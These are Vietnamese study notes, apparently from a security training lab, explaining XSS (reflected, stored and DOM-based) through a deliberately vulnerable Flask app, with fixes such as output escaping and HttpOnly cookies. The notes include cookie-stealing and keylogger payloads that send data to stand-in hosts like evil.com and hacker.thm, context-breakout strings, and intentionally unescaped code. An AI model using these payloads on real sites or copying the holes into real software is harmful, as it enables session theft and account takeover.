# Introduction
- Phần này giới thiệu **XSS (Cross-Site Scripting)** — một trong những lỗ hổng web phổ biến và nguy hiểm nhất hiện nay. 
- XSS cho phép attacker inject malicious scripts vào web pages mà người dùng khác sẽ xem, dẫn đến **session theft, malware delivery, và network escalation**. 
- Room này tập trung vào XSS trong thực tế — từ cách attacker khai thác đến các biện pháp phòng thủ thực tiễn.
## **Tại Sao XSS Vẫn Nguy Hiểm Trong 2026?**

```
Web applications = Trung tâm của mọi business workflow
        ↓
XSS = Con đường DỄ NHẤT để attacker compromise users
        ↓
Các incident thực tế gần đây:
├── Steal session cookies
├── Deliver malware đến users
└── Escalate attacks trong internal network
```

## **XSS Là Gì?**

```
XSS = Cross-Site Scripting

Attacker inject malicious JavaScript
vào web page mà victim sẽ xem
        ↓
JavaScript chạy trong browser của VICTIM
        ↓
Với FULL QUYỀN của victim trên trang đó:
├── Đọc cookies
├── Steal session tokens
├── Thực hiện actions thay victim
└── Redirect đến malicious sites
```

## **Tại Sao Gọi Là "Cross-Site"?**

```
Attacker ở evil.com
        ↓
Inject script vào bank.com
        ↓
Script chạy trong context của bank.com
        ↓
"Cross" = vượt qua ranh giới giữa các sites
```

## **Ba Use Case Nguy Hiểm Trong Thực Tế**

```
Use case 1 — Session Theft:
Script lấy session cookie
→ Gửi về attacker server
→ Attacker login vào account victim

Use case 2 — Malware Delivery:
Script redirect victim đến trang download malware
→ Victim tưởng đang trên trusted site
→ Download và chạy malware

Use case 3 — Network Escalation:
Script chạy trong internal network
→ Scan local services (localhost, 192.168.x.x)
→ Attacker pivot vào internal network
```
## Sự khác nhau giữa XSS và CSRF
- Ngắn gọn dễ hiểu nhất là:
```
CSRF:
Phụ thuộc vào URL/Request
→ Cần LỪA nạn nhân gửi request đến đúng URL
→ Nạn nhân phải làm gì đó (click, visit trang lạ)
→ Attacker chủ động "đẩy" nạn nhân

XSS (Stored):
Đã inject sẵn vào trang bình thường
→ Nạn nhân chỉ cần VÀO TRANG NHƯ BÌNH THƯỜNG
→ Không cần click link lạ
→ Không cần bị lừa đi đâu cả
→ Script tự chạy
```
### Ví Dụ Rõ Ràng

**CSRF — Cần lừa nạn nhân:**

```
Attacker phải:
Tạo link độc → Gửi cho nạn nhân → Chờ họ click
→ Nạn nhân KHÔNG click = Attack thất bại
```

**XSS Stored — Không cần lừa:**

```
Attacker inject script vào:
├── Bình luận của bài viết
├── Tên sản phẩm trong shop
├── Tin nhắn trong chat
└── Bất kỳ nơi nào lưu vào database

Nạn nhân chỉ cần:
Vào đọc bài viết như bình thường
→ Script TỰ CHẠY
→ Không cần biết gì, không cần click gì
```
### 3 Loại XSS — Mức Độ "Cần Lừa" Khác Nhau

```
Stored XSS (nguy hiểm nhất):
Script lưu trong database
→ Ai vào trang cũng bị
→ Không cần lừa ai cả ✅

DOM-based XSS:
Script chạy qua DOM manipulation
→ Không cần server lưu gì
→ Chỉ cần nạn nhân vào đúng URL
→ Cần lừa một chút

Reflected XSS (giống CSRF nhất):
Script nằm trong URL
→ Cần lừa nạn nhân click URL đó
→ Giống CSRF nhất về mặt "cần lừa"
```
# Important Terminologies
## **1. Document Object Model (DOM)**
### Giải thích về DOM
- Khi bạn request một website, dù cho phía backend là ngôn ngữ gì đi nữa (php, ruby, java, etc) thì nó cũng sẽ trả về một trang HTML và **DOM (Document Object Model)** là model dạng cây biểu diễn đầy đủ cấu trúc, mối quan hệ, thuộc tính và nội dung của trang HTML trong bộ nhớ browser.
- DOM được tạo ra qua **4 bước** từ raw bytes → characters → tokens → nodes → DOM tree. 
- JavaScript có thể truy cập và modify DOM thông qua `document` interface.
- Cấu trúc của DOM
![](../Assets/Pasted%20image%2020260629152734.png)
#### 🔄 4 Bước Hình Thành DOM

```
Raw bytes từ server
        │
        ▼
BƯỚC 1: CONVERSION
└── Browser đọc raw bytes
    → Convert sang characters (UTF-8)
    "<html><head></head><body><h1>hii</h1></body></html>"

        │
        ▼
```
![](../Assets/Pasted%20image%2020260629153003.png)
```
BƯỚC 2: TOKENIZING
└── Convert HTML tags → Tokens riêng biệt

    Các loại tokens:
    ├── DOCTYPE
    ├── Start tag  (<html>, <body>, <h1>)
    ├── End tag    (</html>, </body>, </h1>)
    ├── Comment    (<!-- ... -->)
    ├── Character  (text content)
    └── End-of-file

        │
        ▼
```
![](../Assets/Pasted%20image%2020260629153012.png)
```

BƯỚC 3: LEXING
└── Tokens → Node Objects
    Mỗi node có thuộc tính riêng biệt
    (type, value, attributes...)

        │
        ▼
```
![](../Assets/Pasted%20image%2020260629153034.png)
```
BƯỚC 4: DOM CONSTRUCTION
└── Dựa vào HTML markup
    → Xác định quan hệ giữa các nodes
    → Tạo thành DOM TREE
```

---

#### 🌳 Cấu Trúc DOM Tree

```
document (root document)
    └── html (root node)
        ├── head
        │   └── title
        │       └── "Page Title" (text node)
        └── body
            ├── h1
            │   └── "Hello" (text node)
            └── div
                ├── p
                │   └── "Paragraph 1"
                └── p
                    └── "Paragraph 2"

Relationships:
├── html → PARENT của head và body
├── head, body → SIBLINGS (cùng parent)
├── h1, div → CHILDREN của body
└── p, p → SIBLINGS trong div
```

---

#### 📏 Quy Luật Của DOM Tree

```
├── Root document luôn là nút ĐẦU TIÊN
│
├── Mọi node (trừ root) đều có
│   ĐÚNG 1 parent node
│
├── Một node có thể có:
│   ├── Nhiều children
│   ├── Một child
│   └── Không có child nào (leaf node)
│
└── Siblings = Cùng parent node
    ├── firstChild  = Anh cả (đầu tiên)
    └── lastChild   = Em út (cuối cùng)
```

---

#### 🌐 W3C DOM Standard

```
DOM = Platform và language-neutral interface
    = Cho phép programs/scripts
      DYNAMICALLY access và update:
      ├── Content (nội dung)
      ├── Structure (cấu trúc)
      └── Style (CSS)

W3C chia DOM thành 3 phần:
├── Core DOM  → Tất cả document types
├── XML DOM   → XML documents
└── HTML DOM  → HTML documents ← Quan trọng nhất
```

---

#### 🔧 HTML DOM + JavaScript

```
JavaScript truy cập DOM qua: document interface

document = Đại diện cho toàn bộ HTML page
         = Cổng vào DOM tree
```

**Thuộc Tính (Properties) Của document:**

javascript

```javascript
// Thông tin về document
document.title          // Tiêu đề trang
document.URL            // URL hiện tại
document.domain         // Domain name
document.cookie         // Cookies (nếu không HttpOnly)
document.body           // Trỏ đến <body> element
document.head           // Trỏ đến <head> element
document.documentElement // Trỏ đến <html> element
document.forms          // Tất cả forms trong page
document.images         // Tất cả images
document.links          // Tất cả links
```

**Phương Thức (Methods) Của document:**

javascript

```javascript
// TÌM KIẾM elements
document.getElementById('myId')
// → Tìm element có id="myId"

document.getElementsByClassName('myClass')
// → Tìm tất cả elements có class="myClass"

document.getElementsByTagName('div')
// → Tìm tất cả <div> elements

document.querySelector('#myId .myClass')
// → CSS selector, trả về element đầu tiên match

document.querySelectorAll('p')
// → CSS selector, trả về TẤT CẢ elements match

// TẠO elements
document.createElement('div')
// → Tạo element mới

document.createTextNode('Hello')
// → Tạo text node mới

// THÊM vào DOM
document.body.appendChild(newElement)
// → Thêm element vào cuối body

// VIẾT vào document
document.write('<h1>Hello</h1>')
// → Ghi trực tiếp vào document
```
### DOM trong XSS
```
Tại sao DOM quan trọng với XSS:

1. XSS inject code vào DOM
   → Code chạy trong browser của victim

2. Qua DOM, attacker có thể:
   ├── document.cookie
   │   → Steal session cookies
   │
   ├── document.body.innerHTML = "..."
   │   → Thay đổi nội dung trang
   │
   ├── document.createElement('script')
   │   → Inject thêm scripts
   │
   └── document.location = "http://evil.com"
       → Redirect victim

3. DOM-based XSS:
   → Vulnerability nằm TRONG client-side code
   → Không cần server reflect payload
   → Xảy ra khi JS đọc từ untrusted source
      (URL params, hash...) → Ghi vào DOM
```
## 🔗 2. URL Parameters

```
URL: https://site.com/search?q=hello&page=2
                             ↑         ↑
                         Parameter  Parameter

Cấu trúc:
? → Bắt đầu query string
& → Phân cách các parameters
= → Tách key và value

User HOÀN TOÀN KIỂM SOÁT:
└── Gõ trong address bar
└── Click link
└── Submit form

→ LUÔN TREAT là UNTRUSTED INPUT!

Ví dụ XSS qua URL parameter:
https://site.com/search?q=<script>alert(1)</script>
                           ↑
                    Nếu server render trực tiếp
                    → XSS thực thi!
```

---

## ⚡ 3. JavaScript

```
JS chạy TRONG BROWSER của victim

Nếu attacker inject JS qua XSS, có thể:
├── Đọc/sửa DOM
│   document.body.innerHTML = "Hacked!"
│
├── Steal cookies
│   document.cookie
│
├── Make network requests
│   fetch('http://attacker.com?data=' + document.cookie)
│
└── Keylogging, screenshot, redirect...

XSS payload thường là JS snippet nhỏ:
<script>alert(1)</script>          ← Basic test
<script>alert(document.cookie)</script>  ← Cookie theft
```

---

## 🍪 4. Cookies

```
Cookie lưu:
├── Session IDs (quan trọng nhất!)
├── User preferences
└── Authentication tokens

Cookie + XSS = Session Hijacking:

BÌNH THƯỜNG:
User → Cookie: session=abc123 → Server → Authenticated ✅

XSS ATTACK:
Attacker inject: <script>
    fetch('http://evil.com?c=' + document.cookie)
</script>
→ Victim's browser gửi cookie về attacker!
→ Attacker dùng cookie đó → Chiếm session!

DEFENSE — HttpOnly Flag:
Set-Cookie: session=abc123; HttpOnly
                             ↑
                   JavaScript KHÔNG ĐỌC được cookie này
                   → Ngăn cookie theft qua XSS
```

---

## 🛡️ 5. Escaping (Output Encoding)

```
Mục đích:
└── Transform user data → Plain text
    Không cho browser interpret là CODE

Ví dụ:

Input của user (nguy hiểm):
<script>alert(1)</script>

Sau khi ESCAPE (an toàn):
&lt;script&gt;alert(1)&lt;/script&gt;
↑                         ↑
< → &lt;                  > → &gt;

Browser hiển thị:
<script>alert(1)</script>  ← Như text bình thường ✅
KHÔNG thực thi!            ← Không phải code ✅
```

**Escaping vs Filtering:**

```
FILTERING (Input Validation):
└── Check input có hợp lệ không
    Chỉ cho phép chữ, số, độ dài...
    ❌ Không đủ! Vì data vẫn có thể
       trở thành code khi render ra page

ESCAPING (Output Encoding):
└── Transform data khi OUTPUT ra page
    < → &lt;, > → &gt;, " → &quot;...
    ✅ Hiệu quả hơn!
    Browser thấy text, không phải code

Best practice:
└── Dùng CẢ HAI: Filter input + Escape output
```
# XSS Payload
## 🎯 2 Thành Phần Của XSS Payload

```
PAYLOAD = INTENTION + MODIFICATION

INTENTION (Mục tiêu):
└── Attacker muốn làm gì?
    ├── Proof of concept
    ├── Steal cookies
    ├── Log keystrokes
    └── Perform actions

MODIFICATION (Điều chỉnh):
└── Payload cần escape khỏi đâu?
    ├── HTML tag
    ├── HTML attribute
    └── JavaScript block
    → Mỗi target khác nhau → Payload khác nhau
```
- Giải thích escape  thì 
```
Khi input của bạn được đặt VÀO một vị trí nào đó trong HTML
→ Payload cần "thoát ra" khỏi vị trí đó
→ Rồi mới inject code được

Gọi là "escape khỏi context"
```
### Tình Huống 1: Input Nằm Trong HTML Tag

html

```html
<!-- Server render input vào đây -->
<div>HELLO</div>
      ↑
   Input của user = "HELLO"

<!-- Nếu không escape gì → Đơn giản nhất -->
Input: <script>alert(1)</script>

Kết quả:
<div><script>alert(1)</script></div>
→ Script chạy thẳng ✅
→ Không cần escape gì cả
```

---

### Tình Huống 2: Input Nằm Trong Attribute

html

```html
<!-- Server render input vào attribute -->
<input value="HELLO">
               ↑
          Input của user

<!-- Nếu nhập thẳng script -->
Input: <script>alert(1)</script>

Kết quả:
<input value="<script>alert(1)</script>">
→ Script NẰM TRONG attribute → KHÔNG chạy! ❌

<!-- PHẢI ESCAPE KHỎI ATTRIBUTE TRƯỚC -->
Input: "><script>alert(1)</script>

Kết quả:
<input value=""><script>alert(1)</script>
               ↑
         Dấu " đóng attribute lại
         > đóng thẻ input lại
         → Script thoát ra ngoài → CHẠY ✅
```

---

### Tình Huống 3: Input Nằm Trong JavaScript Block

html

```html
<!-- Server render input vào JS -->
<script>
    var name = 'HELLO';
</script>
              ↑
         Input của user

<!-- Nếu nhập thẳng script -->
Input: <script>alert(1)</script>

Kết quả:
<script>
    var name = '<script>alert(1)</script>';
</script>
→ Nằm trong string → KHÔNG chạy! ❌

<!-- PHẢI ESCAPE KHỎI STRING TRƯỚC -->
Input: ';alert(1);//

Kết quả:
<script>
    var name = '';alert(1);//';
</script>
              ↑         ↑  ↑
        ' đóng string   |  // comment hóa phần còn lại
                     alert chạy ✅
```

---

### Hình Dung Bằng Ví Dụ Đời Thường

```
Bạn đang BỊ NHỐT trong phòng (context)
Muốn ra ngoài (escape) trước khi làm gì đó

Phòng 1 (HTML tag):    Cửa mở → Ra ngay được ✅
Phòng 2 (Attribute):   Phải phá khóa " trước → Rồi mới ra ✅
Phòng 3 (JS string):   Phải phá khóa ' trước → Rồi mới chạy ✅
```
---

## 🔍 Nơi Inject XSS Payload

```
Target thường gặp:
├── Search fields
├── Comment sections
├── Profile names
├── Feedback forms
└── URL parameters

Ví dụ URL parameter:
https://site.thm/search?q=hello
                         ↑
                    User-controlled

Page hiển thị:
"You searched for: hello"

Attacker thay bằng:
https://site.thm/search?q=<script>alert(1)</script>

Nếu không sanitize:
"You searched for: [POPUP!]"
```

---

## 💉 4 Loại XSS Payload Theo Intention

### 1. Proof of Concept (PoC)

javascript

```javascript
<script>alert('XSS')</script>

Mục đích:
└── XÁC NHẬN XSS có thể execute
    → Popup xuất hiện = Vulnerable ✅
    → Không có popup = Protected ❌

Dùng khi:
└── Bước đầu tiên khi test
    Confirm trước → Exploit sau
```

### 2. Session Stealing

javascript

```javascript
<script>
fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
</script>

Phân tích:
├── document.cookie    → Lấy cookies của victim
├── btoa()             → Base64 encode
│                         (Safe transmission)
└── fetch()            → Gửi về attacker server

Flow:
Victim visit page
      ↓
JS execute → document.cookie = "session=abc123"
      ↓
btoa("session=abc123") = "c2Vzc2lvbj1hYmMxMjM="
      ↓
fetch('hacker.thm/steal?cookie=c2Vzc2lvbj1hYmMxMjM=')
      ↓
Attacker server nhận cookie
      ↓
Attacker dùng cookie → Session hijack!
```

### 3. Key Logger

javascript

```javascript
<script>
document.onkeypress = function(e) {
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
}
</script>

Phân tích:
├── document.onkeypress  → Event listener
│                           Trigger mỗi khi victim gõ phím
├── e.key               → Phím vừa được gõ
└── btoa() + fetch()    → Encode và gửi về attacker

Thu thập được:
├── Usernames
├── Passwords
├── Credit card numbers
└── Bất kỳ thứ gì victim gõ
```

### 4. Business Logic Attack

javascript

```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>

Phân tích:
├── user.changeEmail()   → Gọi function CÓ SẴN trong app
└── 'attacker@hacker.thm' → Email của attacker

Attack chain:
1. Inject payload → Đổi email thành của attacker
2. Attacker click "Forgot Password"
3. Reset link gửi về attacker email
4. Attacker reset password
5. FULL ACCOUNT TAKEOVER! 🔓

Tại sao nguy hiểm:
└── Dùng legitimate functions của app
    → Khó detect hơn
    → Không cần external server
```

---

## 📊 So Sánh Các Loại Payload

|Loại|Complexity|Impact|External Server?|
|---|---|---|---|
|**PoC**|Thấp nhất|Xác nhận vulnerability|❌ Không|
|**Session Stealing**|Trung bình|Account takeover|✅ Cần|
|**Key Logger**|Trung bình|Steal credentials|✅ Cần|
|**Business Logic**|Cao|Account takeover|❌ Không|

---

## 🔄 Testing Workflow

```
BƯỚC 1: Inject PoC
<script>alert('XSS')</script>
          ↓
Popup xuất hiện? → Vulnerable ✅

BƯỚC 2: Xác định context
└── Input reflect ở đâu trong HTML?
    ├── Trong tag? → <div>INPUT</div>
    ├── Trong attribute? → <input value="INPUT">
    └── Trong JS? → var x = 'INPUT';

BƯỚC 3: Modify payload
└── Escape khỏi context hiện tại
    rồi inject payload

BƯỚC 4: Escalate
└── Replace PoC bằng payload thật
    (session stealing, keylogger...)
```
# Reflected XSS - Non-Persistent(Không tồn tại lâu dài)
- **Reflected XSS** xảy ra khi web app nhận user input (query string, form field, header) và **hiển thị ngay lập tức lên page mà không sanitize**. 
- Attacker craft malicious link chứa JavaScript, dụ victim click — browser "reflect" payload và execute script trong context của site. 
- Root cause là output untrusted data như code thay vì escape đúng cách.
## 🔍 Cơ Chế Reflected XSS

```
FLOW:

1. Attacker craft malicious URL:
   http://site.com/search?q=<script>alert('XSS')</script>

2. Victim click link

3. Browser gửi request đến server với payload trong URL

4. Server đọc parameter q → Render vào HTML:
   "You searched for: <script>alert('XSS')</script>"

5. Browser nhận HTML → Parse → EXECUTE script!
   → Popup xuất hiện ✅ → Confirmed Vulnerable!
```

---

## 📋 Phân Tích Source Code (app.py)
```python
from flask import Flask, request, render_template, redirect
from markupsafe import escape
from datetime import datetime

app = Flask(__name__)

# Helper để hiển thị năm hiện tại trong footer
@app.context_processor
def inject_now():
    return {"now": lambda: datetime.utcnow().year}

# Dữ liệu mẫu
NEWS = [
    {"title": "Product launch: SecureMail", "summary": "A privacy-focused email client arrives."},
    {"title": "Weekly Roundup", "summary": "Top vulnerabilities and patches this week."},
    {"title": "Research: XSS Trends 2025", "summary": "A short summary of XSS cases observed in the wild."},
]

COMMENTS = []

@app.route("/")
def home():
    q = request.args.get("q", "")
    query_escaped = escape(q)
    return render_template("news.html", news=NEWS, query=q, query_escaped=query_escaped)

@app.route("/guestbook", methods=["GET", "POST"])
def guestbook():
    if request.method == "POST":
        name = request.form.get("name", "Anonymous")
        comment = request.form.get("comment", "")
        COMMENTS.append({"name": escape(name), "comment": comment})
        return redirect("/guestbook")
    
    return render_template("guestbook.html", comments=COMMENTS)

@app.route("/dom")
def dom_preview():
    return render_template("dom_preview.html")

if __name__ == "__main__":
    # Chạy trên tất cả interface (dễ test lab)
    app.run(debug=True, host="0.0.0.0", port=5000)
```

### Import & Setup
```python
from flask import Flask, request, render_template, redirect
from markupsafe import escape
from datetime import datetime

app = Flask(__name__)
```

```
├── Flask          → Web framework
├── request        → Truy cập data từ HTTP request (GET/POST params)
├── render_template → Render file HTML (Jinja2 templates)
├── redirect       → Chuyển hướng user đến URL khác
├── escape         → Function escape HTML (chống XSS)
└── datetime       → Lấy năm hiện tại cho footer
```

---

### Context Processor

python

```python
@app.context_processor
def inject_now():
    return {"now": lambda: datetime.utcnow().year}
```

```
Chức năng:
└── Biến "now" được TỰ ĐỘNG có sẵn
    trong MỌI template, không cần pass thủ công

Dùng trong template:
{{ now() }}  ← Trả về năm hiện tại (vd: 2026)
              → Dùng cho footer "© 2026 AtlasNews"

Không liên quan đến XSS, chỉ là utility function
```

---

### Data Storage (In-Memory)

python

```python
NEWS = [
    {"title": "Product launch: SecureMail", "summary": "..."},
    {"title": "Weekly Roundup", "summary": "..."},
    {"title": "Research: XSS Trends 2025", "summary": "..."},
]

COMMENTS = []
```

```
NEWS:
└── List các bài báo CỐ ĐỊNH (hardcoded)
    Không liên quan trực tiếp đến XSS

COMMENTS:
└── List TRỐNG ban đầu
    └── Sẽ lưu comments từ guestbook
    └── ĐÂY LÀ NƠI ĐÁNG CHÚ Ý cho Stored XSS!
        (Data lưu lại → Mọi visitor đều thấy)
```

---

### Route "/" — REFLECTED XSS Ở ĐÂY! 🎯

python

```python
@app.route("/")
def home():
    q = request.args.get("q", "")
    query_escaped = escape(q)

    return render_template("news.html",
                          news=NEWS,
                          query=q,
                          query_escaped=query_escaped)
```

#### Phân Tích Từng Dòng:

```python
q = request.args.get("q", "")
```

```
├── request.args  → Lấy query parameters từ URL
│                   (phần sau dấu ?)
├── .get("q", "") → Lấy giá trị của parameter "q"
│                   Nếu không có → default = ""
└── q             → Biến chứa RAW, UNTRUSTED input

Ví dụ:
URL: http://site.com/?q=hello
→ q = "hello"

URL: http://site.com/?q=<script>alert(1)</script>
→ q = "<script>alert(1)</script>"  ← NGUY HIỂM!
```

```python
query_escaped = escape(q)
```

```
└── Tạo bản ESCAPED của q
    HTML special characters được encode:
    < → &lt;
    > → &gt;
    " → &quot;
    ' → &#39;
    & → &amp;

Ví dụ:
q = "<script>alert(1)</script>"
query_escaped = "&lt;script&gt;alert(1)&lt;/script&gt;"
                 ↑
            An toàn để render
```

```python
return render_template("news.html",
                      news=NEWS,
                      query=q,              # ⚠️ RAW!
                      query_escaped=query_escaped)  # ✅ SAFE
```

```
🚨 VẤN ĐỀ CHÍNH NẰM Ở ĐÂY:

Code TRUYỀN CẢ HAI biến vào template:
├── query = q                    → RAW, KHÔNG escape
└── query_escaped = escape(q)    → Đã escape, AN TOÀN

→ Đây là LỖ HỔNG THIẾT KẾ!

Nếu template news.html dùng:
{{ query }}          → VULNERABLE (Reflected XSS) ❌
{{ query_escaped }}  → SAFE ✅

Developer đã tạo phiên bản an toàn (query_escaped)
NHƯNG vẫn để raw version (query) có thể bị dùng nhầm
trong template!
```
---

## 🎯 Payload Và Impact

```
Test payload cơ bản:
<script>alert('Hack')</script>

URL đầy đủ:
http://MACHINE_IP:5000/?q=<script>alert('Hack')</script>

Kết quả nếu vulnerable:
├── Popup alert xuất hiện ✅
└── Injected content trong search results area

Impact thực tế:
├── Steal cookies:
│   ?q=<script>fetch('http://evil.com?c='+document.cookie)</script>
│
├── Session hijacking
├── Perform actions thay victim
└── Load malicious content
```

---

## 📌 Đặc Điểm Của Reflected XSS

```
REFLECTED XSS:
├── Payload KHÔNG lưu trong database
├── "Reflect" ngay lập tức từ request
├── Victim PHẢI click malicious link
├── Mỗi lần attack cần victim click lại
└── Thường qua: search boxes, error messages,
               URL params, POST body

So với Stored XSS:
├── Stored: Payload lưu trong DB
│   → Mọi user visit đều bị
└── Reflected: Chỉ affect user click link
    → Cần social engineering
```

---

## 🌐 Trigger Points Phổ Biến

```
├── Search boxes          → ?q=PAYLOAD
├── Error messages        → ?error=PAYLOAD
├── URL parameters        → ?name=PAYLOAD&page=PAYLOAD
└── POST body             → form fields phản chiếu lại
```

---

## 🛡️ Root Cause & Fix

```
ROOT CAUSE:
└── Output untrusted data AS CODE
    thay vì escape cho đúng context

FIX:
├── Luôn dùng escaped version trong template
│   {{ query_escaped }} thay vì {{ query }}
│
├── Escape đúng context:
│   HTML context → HTML escape
│   JS context   → JS escape
│   URL context  → URL encode
│
└── Không pass raw user input vào template
    khi không cần thiết
```
# Stored XSS - Persistent(Tồn tại lâu dài)
- **Stored XSS** xảy ra khi application **lưu trữ** attacker-controlled input (thường vào database) và sau đó serve content này cho user khác **mà không escape**. 
- Khác với Reflected XSS, Stored XSS **persistent** — một lần inject, ảnh hưởng đến **mọi visitor** xem trang đó theo thời gian, kể cả admins. 
- Đây là lý do Stored XSS được coi là **nguy hiểm hơn** Reflected XSS.
## 🔄 Cơ Chế Stored XSS

```
FLOW:

1. Attacker tìm input field lưu vào DB
   (comment, profile bio, review...)

2. Attacker submit payload:
   <script>alert('Hacked')</script>

3. Server LƯU payload vào database
   (KHÔNG escape khi lưu)

4. MỌI visitor sau đó load trang
   → Server query DB → Render comment
   → Payload chạy trong browser MỌI người
   → Không cần click link đặc biệt!
```

---

## ⚔️ So Sánh Reflected vs Stored XSS

|                            | Reflected XSS          | Stored XSS                |
| -------------------------- | ---------------------- | ------------------------- |
| **Lưu trữ?**               | ❌ Không, reflect ngay | ✅ Lưu vào DB             |
| **Cần victim click link?** | ✅ Có                  | ❌ Không cần              |
| **Số người bị ảnh hưởng**  | Chỉ người click link   | TẤT CẢ visitors           |
| **Persistent?**            | ❌ Một lần             | ✅ Mãi mãi (đến khi xóa)  |
| **Mức độ nguy hiểm**       | Trung bình             | **CAO HƠN**               |
| **Có thể nhắm admin?**     | Khó                    | ✅ Dễ (admin xem comment) |


---

## 🎯 Nơi Stored XSS Thường Xuất Hiện

```
├── Comment sections
├── User profiles (bio, display name)
├── Message boards
├── Product reviews
└── File upload features (metadata: filename, description)
```

---

## 🧪 Thực Hành Trên Guestbook

```
BƯỚC 1: Truy cập
http://MACHINE_IP:5000/guestbook

BƯỚC 2: Nhập payload vào Comment field
<script>alert('You are Hacked')</script>

BƯỚC 3: Click Submit
→ Comment được LƯU vào COMMENTS list

BƯỚC 4: Reload page
→ Nếu vulnerable → Alert popup xuất hiện ✅

BƯỚC 5: Confirm persistence
→ Visitor BẤT KỲ vào trang này
→ Cũng thấy alert popup
→ Vì payload đã được LƯU TRỮ!
```

---

## 🔍 Root Cause Phân Tích
### Route "/guestbook" — Liên Quan Stored XSS
```python
@app.route("/guestbook", methods=["GET", "POST"])
def guestbook():

    if request.method == "POST":
        name = request.form.get("name", "Anonymous")
        comment = request.form.get("comment", "")

        COMMENTS.append({"name": escape(name), "comment": comment})
        return redirect("/guestbook")

    return render_template("guestbook.html", comments=COMMENTS)
```

#### Phân Tích:

```python
if request.method == "POST":
```

```
└── Chỉ xử lý khi user SUBMIT form (POST)
    Nếu GET → Bỏ qua khối này, đi xuống render_template
```

```python
name = request.form.get("name", "Anonymous")
comment = request.form.get("comment", "")
```

```
├── request.form    → Lấy data từ POST form
│                     (khác request.args là từ URL)
├── name            → Default "Anonymous" nếu trống
└── comment         → Default "" nếu trống

Cả 2 đều là RAW INPUT từ user
```

```python
COMMENTS.append({"name": escape(name), "comment": comment})
```

```
🚨 BẤT ĐỐI XỨNG TRONG ESCAPE:

├── "name": escape(name)     → ĐÃ ESCAPE ✅
└── "comment": comment       → KHÔNG ESCAPE! ❌
                                ↑
                          STORED XSS Ở ĐÂY!

→ Comment được LƯU TRỮ (append vào COMMENTS list)
  với raw, unescaped data!

Nếu template guestbook.html render:
{{ c.comment }} (không escape thêm)
→ MỌI USER xem guestbook đều bị XSS!
  (Đây chính là STORED XSS,
   khác với Reflected XSS ở route "/")
```

```python
return redirect("/guestbook")
```

```
└── Sau khi POST thành công
    → Redirect về GET /guestbook
    → Pattern PRG (Post-Redirect-Get)
    → Tránh duplicate submission khi F5
```
- Giải thích tại sao Tránh duplicate submission khi F5:
+Khi user submit form (POST request), browser sẽ **lưu lại "công thức"** đã tạo ra trang hiện tại — bao gồm Method (POST), URL, và Body data — chứ không lưu HTML kết quả tĩnh. 
+Lý do là vì tính năng **F5 (Reload)** được thiết kế để luôn lấy dữ liệu **mới nhất** từ server (vì data có thể đã thay đổi từ user khác), nên F5 không thể chỉ hiện lại HTML cũ mà phải **gửi lại chính xác request đã tạo ra trang đó**.
+Vấn đề xảy ra khi trang hiện tại được tạo từ **POST có side-effect** (như lưu comment vào database). 
+Nếu user nhấn F5, browser sẽ cố gắng **lặp lại đúng POST request đó** để "tái tạo" trang — nghĩa là gửi lại data comment lần nữa, dẫn đến **duplicate submission** (comment bị lưu 2 lần, đơn hàng bị đặt 2 lần...). 
+Đây chính là lý do trình duyệt thường hiện cảnh báo _"Confirm Form Resubmission"_ khi F5 sau một POST request.
+**Giải pháp (PRG Pattern)** là sau khi server xử lý xong POST request, thay vì trả về HTML kết quả trực tiếp, server sẽ **redirect (HTTP 302)** sang một **GET request** khác:
```python
if request.method == "POST":
    # Xử lý lưu comment vào database
    COMMENTS.append({"name": escape(name), "comment": comment})
    return redirect("/guestbook")  # ← Redirect sang GET
```

+Sau redirect, browser sẽ ghi nhớ rằng trang hiện tại được tạo từ **GET /guestbook** thay vì POST. 
+Vì vậy khi user nhấn F5 sau đó, browser chỉ gửi lại **GET request** (vốn không có side-effect) thay vì lặp lại POST — nhờ đó tránh được hiện tượng duplicate submission một cách an toàn.
```python
return render_template("guestbook.html", comments=COMMENTS)
```

```
└── Khi GET request
    → Render toàn bộ comments đã lưu
    → Bao gồm cả comment KHÔNG escaped!
```

**Giải thích `|safe` filter:**

```
Jinja2 (Flask template engine) MẶC ĐỊNH auto-escape:
{{ comment }}        → Tự động escape (AN TOÀN)

Nhưng developer dùng:
{{ comment|safe }}   → TẮT auto-escape (NGUY HIỂM!)
         ↑
    "safe" filter nói với Jinja2:
    "Tôi BIẾT data này an toàn, đừng escape nó"
    
    → SAI LẦM vì comment là USER INPUT,
      KHÔNG BAO GIỜ nên trust là "safe"!
```

---

## 💥 Impact Của Stored XSS

```
Vì PERSISTENT và ảnh hưởng MỌI USER:

ATTACKER có thể:
├── Steal cookies của TẤT CẢ visitors
│   <script>fetch('evil.com?c='+document.cookie)</script>
│
├── Steal admin session (nếu admin xem comment)
│   → Admin takeover → Full site compromise!
│
├── Keylog mọi user xem trang
│
└── Defacement (thay đổi giao diện cho mọi người)
```

**Scenario nguy hiểm nhất:**

```
1. Attacker post comment với XSS payload
2. Admin vào trang quản lý comments để moderate
3. Admin's browser execute payload
4. Payload steal admin's session cookie
5. Attacker dùng cookie → Login as admin
6. FULL ADMIN ACCESS! 🔓
```
# DOM-Based XSS-Client Side
- **DOM-based XSS** xảy ra hoàn toàn ở **client-side** — client-side JavaScript đọc data từ DOM sources (URL, hash, localStorage...) và ghi lại vào page bằng các **dangerous sinks** (`innerHTML`, `document.write`, `eval`) mà không sanitize. 
- Khác với Reflected/Stored XSS, payload **không bao giờ chạm đến server** — browser DOM tự nó trở thành attack surface, khiến **server-side defenses hoàn toàn vô hiệu**.
- Và nó cũng liên quan đến Taint-Flow Vulnerabilities vì DOM là 1 cây cấu trúc nên khi 1 phần bị nhiễm độc cũng sẽ ảnh hưởng tới các phần khác
## Taint-Flow Vulnerabilities
- **Taint-flow vulnerabilities** là tên gọi khác của các lỗ hổng bảo mật như XSS, SQL Injection, Command Injection — tất cả đều dựa trên cùng một mô hình: dữ liệu **"tainted" (bị nhiễm độc)** từ nguồn không tin cậy **chảy** qua ứng dụng đến một điểm nguy hiểm (**sink**) mà không được kiểm tra hay làm sạch.
### 🧪 Taint & Taint Flow

```
TAINT (Bị nhiễm độc):
└── Dữ liệu đến từ nguồn KHÔNG ĐÁNG TIN CẬY
    chưa được kiểm tra
    Ví dụ: User input, cookies, URL params

TAINT FLOW (Dòng chảy nhiễm độc):
└── Quá trình dữ liệu tainted DI CHUYỂN
    qua các phần của ứng dụng
    mà KHÔNG bị kiểm tra/làm sạch
    → Dẫn đến XSS, SQLi, Command Injection
```

---

